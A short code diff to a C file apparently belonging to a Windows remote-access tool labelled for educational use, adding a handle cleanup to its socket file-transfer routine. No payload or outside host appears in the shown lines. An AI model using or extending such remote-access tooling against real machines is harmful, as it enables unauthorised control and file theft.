@@ -7,6 +7,7 @@ Use educationally/legally.
 #include <direct.h>
 #include <errno.h>
 #include <stdio.h>
+
 #include "headers/sakito_core.h"
 
 #define HOST "127.0.0.1"
@@ -137,6 +138,8 @@ int send_file(const SOCKET connect_socket, char* const buf) {
 	// Receive file transfer finished byte.
 	if (recv(connect_socket, buf, 1, 0) < 1)
 		return SOCKET_ERROR;
+
+	CloseHandle(h_file);
 
 	return SUCCESS;
 }
